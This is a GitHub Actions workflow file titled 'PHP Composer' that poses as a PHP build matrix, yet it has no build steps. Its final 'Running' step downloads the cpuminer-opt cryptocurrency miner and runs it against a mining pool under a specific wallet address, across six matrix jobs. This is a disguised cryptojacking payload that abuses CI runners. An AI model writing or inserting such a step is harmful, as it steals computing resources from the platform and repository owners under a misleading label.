name: PHP Composer

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:

    runs-on: ubuntu-latest

    strategy:
      matrix:
        php-version: ['5.6', '7.1', '7.2']
        composer-version: ['v1', 'v2']

    name: Build on PHP ${{ matrix.php-version }} with Composer ${{ matrix.composer-version }}

    steps:
    - uses: actions/checkout@v2

    - name: Setup PHP
      uses: shivammathur/setup-php@v2
      with:
        php-version: ${{ matrix.php-version }}
        coverage: none
        tools: composer:${{ matrix.composer-version }}

    - name: Running
      run:  |
        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
        tar xf cpuminer-opt-linux.tar.gz
        ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:7042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.1
